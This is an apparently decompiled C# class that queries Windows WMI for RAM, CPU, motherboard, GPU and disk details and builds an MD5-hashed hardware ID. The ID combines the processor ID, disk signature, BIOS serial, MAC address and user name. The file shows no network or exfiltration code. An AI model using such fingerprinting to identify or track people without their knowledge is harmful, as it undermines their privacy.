using NoiseMe.Drags.App.Models;
using NoiseMe.Drags.App.Models.WMI.Enums;
using NoiseMe.Drags.App.Models.WMI.Objects;
using System;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Data.WMI
{
	public static class HardwareGatherer
	{
		public static ICollection<RamStick> GetRamSticks()
		{
			List<RamStick> list = new List<RamStick>();
			string[] properties = new string[5]
			{
				"Capacity",
				"ConfiguredClockSpeed",
				"Manufacturer",
				"SerialNumber",
				"PositionInRow"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_PhysicalMemory", properties);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass item2 in wmiInstanceClassCollection)
			{
				RamStick item = new RamStick((ulong?)item2["Capacity"].Value, (uint?)item2["ConfiguredClockSpeed"].Value, (string)item2["Manufacturer"].Value, (string)item2["SerialNumber"].Value, (uint?)item2["PositionInRow"].Value);
				list.Add(item);
			}
			return list;
		}

		public static ulong? GetTotalMemoryCapacity()
		{
			ulong? num = 0uL;
			foreach (RamStick ramStick in GetRamSticks())
			{
				num += ramStick.Capacity;
			}
			if (num != 0)
			{
				return num;
			}
			return null;
		}

		public static ICollection<Processor> GetProcessors()
		{
			List<Processor> list = new List<Processor>();
			string[] properties = new string[6]
			{
				"CurrentClockSpeed",
				"CurrentVoltage",
				"Name",
				"Manufacturer",
				"NumberOfCores",
				"ProcessorId"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_Processor", properties);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass item2 in wmiInstanceClassCollection)
			{
				Processor item = new Processor((uint?)item2["CurrentClockSpeed"].Value, (ushort?)item2["CurrentVoltage"].Value, (string)item2["Name"].Value, (string)item2["Manufacturer"].Value, (uint?)item2["NumberOfCores"].Value, (string)item2["ProcessorId"].Value);
				list.Add(item);
			}
			return list;
		}

		public static BaseBoard GetBaseBoard()
		{
			string condition = "PoweredOn = TRUE";
			string[] properties = new string[6]
			{
				"Model",
				"Product",
				"Name",
				"Manufacturer",
				"SerialNumber",
				"PoweredOn"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_Baseboard", properties, condition);
			if (wmiInstanceClassCollection == null || wmiInstanceClassCollection.Count == 0)
			{
				return null;
			}
			WmiInstanceClass wmiInstanceClass = wmiInstanceClassCollection[0];
			return new BaseBoard((string)wmiInstanceClass["Model"].Value, (string)wmiInstanceClass["Product"].Value, (string)wmiInstanceClass["Name"].Value, (string)wmiInstanceClass["Manufacturer"].Value, (string)wmiInstanceClass["SerialNumber"].Value);
		}

		public static ICollection<GraphicsCard> GetGraphicsCards()
		{
			List<GraphicsCard> list = new List<GraphicsCard>();
			string[] properties = new string[4]
			{
				"AdapterRAM",
				"Caption",
				"Description",
				"Name"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_VideoController", properties);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass item2 in wmiInstanceClassCollection)
			{
				GraphicsCard item = new GraphicsCard((uint?)item2["AdapterRAM"].Value, (string)item2["Caption"].Value, (string)item2["Description"].Value, (string)item2["Name"].Value);
				list.Add(item);
			}
			return list;
		}

		public static uint? GetTotalGpuMemoryCapacity()
		{
			uint? num = 0u;
			foreach (GraphicsCard graphicsCard in GetGraphicsCards())
			{
				num += graphicsCard.MemoryCapacity;
			}
			if (num != 0)
			{
				return num;
			}
			return null;
		}

		public static ICollection<HardDrive> GetHardDrives()
		{
			List<HardDrive> list = new List<HardDrive>();
			string[] properties = new string[4]
			{
				"Caption",
				"Model",
				"Signature",
				"Size"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_DiskDrive", properties);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass item2 in wmiInstanceClassCollection)
			{
				HardDrive item = new HardDrive((string)item2["Caption"].Value, (string)item2["Model"].Value, (uint?)item2["Signature"].Value, (ulong?)item2["Size"].Value);
				list.Add(item);
			}
			return list;
		}

		public static string GetHwid(HwidStrength hwidStrength, bool ignoreNullValues = false)
		{
			string text = null;
			uint? num = null;
			string text2 = null;
			string text3 = null;
			foreach (Processor processor in GetProcessors())
			{
				if (processor.Id != null)
				{
					text = processor.Id;
				}
			}
			foreach (HardDrive hardDrife in GetHardDrives())
			{
				if (hardDrife.Signature.HasValue)
				{
					num = hardDrife.Signature;
				}
			}
			text2 = BiosGatherer.GetSerialNumber();
			text3 = NetGatherer.GetActiveMacAddress();
			switch (hwidStrength)
			{
			case HwidStrength.Light:
				if (ignoreNullValues || text != null)
				{
					return DataRecoveryHelper.GetMd5Hash(text + Environment.UserName).Replace("-", string.Empty);
				}
				return null;
			case HwidStrength.Medium:
				if (ignoreNullValues || (text != null && num.HasValue))
				{
					return DataRecoveryHelper.GetMd5Hash(text + num + Environment.UserName).Replace("-", string.Empty);
				}
				return null;
			case HwidStrength.Strong:
				if (ignoreNullValues || (text != null && num.HasValue && text2 != null && text3 != null))
				{
					return DataRecoveryHelper.GetMd5Hash(text + num + text2 + text3 + Environment.UserName).Replace("-", string.Empty);
				}
				return null;
			default:
				return null;
			}
		}
	}
}
